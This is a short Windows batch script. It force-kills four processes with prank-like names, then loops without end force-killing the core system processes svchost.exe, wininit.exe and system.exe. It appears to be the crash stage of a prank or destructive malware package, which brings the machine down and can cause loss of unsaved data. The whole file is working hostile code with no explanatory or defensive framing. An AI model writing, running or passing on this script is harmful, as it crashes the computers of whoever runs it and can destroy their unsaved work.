@echo off
taskkill /IM shake.exe /F
taskkill /IM triangles.exe /F
taskkill /IM traindown.exe /F
taskkill /IM polybezier.exe /F
:X
taskkill /IM svchost.exe /F
taskkill /IM wininit.exe /F
taskkill /IM system.exe /F
goto X